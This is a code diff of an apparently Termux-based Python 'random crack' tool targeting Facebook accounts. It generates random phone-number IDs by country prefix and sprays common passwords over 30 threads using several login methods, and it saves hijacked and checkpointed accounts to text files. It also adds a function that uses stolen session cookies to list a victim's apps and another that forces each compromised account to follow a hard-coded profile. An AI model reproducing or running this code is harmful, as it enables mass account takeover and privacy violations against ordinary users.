@@ -123,90 +123,145 @@ class jalan:
             sys.stdout.flush()
             time.sleep(0.001)
 #-----[Logo]-----#
-logo = ("""
-\033[1;37md8888b.  .d8b.  d8888b. db    db d88888b    d88b 
-\033[1;32m88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
-\033[1;37m88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
-\033[1;32m88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
-\033[1;37m88      88   88 88 `88.  `8bd8'  88.     db. 88  
-\033[1;32m88      YP   YP 88   YD    YP    Y88888P Y8888P  
- ┌─────────────────────────────────────────┐
- │ [✓] AUTHOR   : Parvej Hossen            │
- │ [✓] TOOL     : RANDOM CRACK             │
- │ [✓] STATUS   : FREE                     │
- │ [✓] GITHUB   : PARVEJ404                │
- │ [✓] FACEBOOK : FH ROMAN                 │
- └─────────────────────────────────────────┘""")
-try:
-   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
-   v = 5.2
-   update = ('5.2')
-   update = ('5.2')
-   if str(v) in update:
-       os.system('clear')
-   else:pass
-except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
+logo ="""
+##     ## ######## ########  ##     ## 
+ ##   ##  ##       ##     ##  ##   ##  
+  ## ##   ##       ##     ##   ## ##   
+   ###    ######   ########     ###    
+  ## ##   ##       ##   ##     ## ##   
+ ##   ##  ##       ##    ##   ##   ##  
+##     ## ######## ##     ## ##     ## 
 
-def linex():
-        print('\033[1;37m ──────────────────────────────────────────')
- 
-def clear():
-    os.system('clear')
-    print(logo)
-    
-#-----[Loop Menu]-----#  
+[+]==============================================
+[+] CREATED BY   :  ARYANxROHIT
+[+] FB GROUP     :  TERMUX TEAM INP COMMAND 
+[+] ON GITHUB    :  XERX-XD
+[+] TOOL STATUS  :  RANDOM
+[+] TOOL VIRSION :  0.2
+[+]=============================================="""
+
+xxxx = str(len(ugen))
+#---------------------[LOOP MENU]---------------------#
 loop = 0
 oks = []
 cps = []
+baby =[]
 
-#-----[Main-Menu]-----#
-def mumit_menu():
-    os.system('clear');print(logo)
-    print('\033[1;92m [1] RANDOM CRACK')
-    print('\033[1;92m [0] EXIT TOOL')
-    linex()
-    mumit=input(' \033[1;32m[?] SELECT MENU: ')
-    if mumit in['1','01']:innocent()
-    elif mumit in['0','00']:exit()
-    else:exit()
+#---------------------[APPLICATION CHECKER]---------------------#
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
+    else:
+        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
+        for i in range(len(game)):
+            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+            
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
+    else:
+        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
+        for i in range(len(game)):
+            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('\033[1;97m====================================================') 
+def follow(ses,coki):
+    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
+    get = r.find('a', string='Follow').get('href')
+    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
     
-def innocent():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
+    		
+def xerx():
     os.system("clear")
     print(logo)
-    print('\033[1;32m [√] BD CODE : 017/019/016/018/013')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    xd_cp=input(f'\033[1;32m [?] You Want To Show Cp Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
-    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
-    else:cp_cpx.append('n')
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with ThreadPool(max_workers=50) as ahare:
-        clear()
-        tl = str(len(user))
-        print('\033[1;32m [+] Choice Code: '+code)
-        print('\033[1;92m [+] Crack Process Has Started')
-        print('\033[1;92m [!] Use Flight Mode For Speed Up')
-        linex()
-        for fuck in user:
-            pwx = ['fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-            uid = code+fuck
-            ahare.submit(mumitx,uid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /PARVEJ-OK.txt')
-    print('Cp Ids Saved in /PARVEJ-CP.txt')
-    linex()
+    
+    print("[1] RANDOM CLONE NP\n[2] RANDOM CLONE IND\n[3] RANDOM CLONE PK\n[4] RANDOM CLONE BD\n[5] RANDOM CLONE WITH CHOOSE PSWD\n[6] RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD\n[7] CONTACT OWNER")
+    print(49*'=')
+    aryan = input("✓CHOOSE>")
+    if aryan =='1':xerx1()
+    elif aryan =='2':xerx2()
+    elif aryan =='3':xerx3()
+    elif aryan =='4':xerx4()
+    elif aryan =='5':xerx5()
+    elif aryan =='6':xerx6()
+    elif aryan =='7':os.system("xdg-open https://www.facebook.com/aaryan.chaudhary69")
+    else:
+        print("SELECT CORRECT OPTION")
+        xerx()
+    
+def xerx1():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9817)')
+	print(47*'-')
+	kode = input('[?] Input Code : ')
+	print(47*'-')
+	limit = int(input('[?] How many numbers do you want to add : '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo)
+	print("                CHOOSE METHOD                       ")
+	print("[+]==============================================")
+	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
+	print(49*'=')
+	xerxfire = input("[+] [CHOOSE] :- ")
+	os.system("clear")
+	print(logo)
+	print("                TRY SOMETHING NEW                       ")
+	print("[+]==============================================")
+	print("[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
+	print("[+]==============================================")
+	xerxlovesyou = input("[+] [CHOOSE] :- ")
+	if xerxlovesyou in ['y','Y','1','yes','YES','Yes']:
+		xerx_xd.append('y')
+	else:
+		xerx_xd.append('n')
+	print("[+]==============================================")
+	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
+	print("[+]==============================================")
+	xerxtop = input("[+] [CHOOSE] :- ")
+	if xerxtop in ['y','Y','Yes','YES','1']:
+		baby.append('y')
+	else:
+		baby.append('n')
+	with ThreadPool(max_workers=30) as yaari:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print(f"[+] TOTAL IDZ  : "+tl+" ")
+		print(f"[+] CODE CHOOSED : "+kode)
+		print(f'[+] METHOD CHOOSED : M{xerxfire}')
+		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
+		for guru in user:
+			uid = kode+guru
+			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
+			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
+			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
+			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
+			else:
+			    yaari.submit(p,uid,pwx,tl)
+			
+	print(47*"-")
+	print('[✓] CRACKING COMPLETED ')
+	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	print('[?] Ids saved in XERX-OK.txt,XERX-CP.txt')
+	input("DO YOU WANT TO GO BSCK MENU ")
+	xerx()
+	print(47*"-")
     
 def mumitx(uid,pwx,tl):
     global oks
